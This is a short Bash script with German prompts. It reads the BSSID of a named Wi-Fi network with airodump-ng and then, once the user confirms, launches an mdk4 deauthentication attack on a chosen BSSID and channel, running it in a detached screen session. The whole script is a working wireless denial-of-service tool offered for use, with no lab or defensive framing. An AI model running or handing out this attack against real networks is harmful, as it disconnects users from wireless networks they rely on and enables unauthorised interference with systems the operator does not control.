#!/bin/bash

function get_bssid {
    local interface=$1
    local essid=$2

    airodump-ng "$interface" --essid "$essid" --output-format csv -w output

    local bssid=$(tail -n 1 output-01.csv | cut -d ',' -f 1)

    echo "Die BSSID für ESSID '$essid' ist: $bssid"

    rm output-01.csv output-01.kismet.csv
}

function perform_deauth {
    local channel=$1
    local bssid=$2

    screen -dmS deauth mdk4 wlan1 d -c "$channel" -B "$bssid"

    echo "Deauthentication-Angriff gestartet für BSSID '$bssid'."

}

while true; do
    echo "Gib die ESSID ein:"
    read essid

    echo "Gib deine WLAN-Schnittstelle ein:"
    read interface

    get_bssid "$interface" "$essid"

    read -p "Möchtest du ein weiteres Netzwerk auslesen? (ja/nein): " execute

    if [[ "${execute,,}" != "ja" ]]; then
        break
    fi
done

read -p "Möchtest du ein Netzwerk angreifen? (ja/nein): " execute

if [[ "${execute,,}" == "ja" ]]; then
    echo "Gib den Channel an:"
    read channel

    echo "Gib die BSSID an:"
    read bssid

    perform_deauth "$channel" "$bssid"
fi
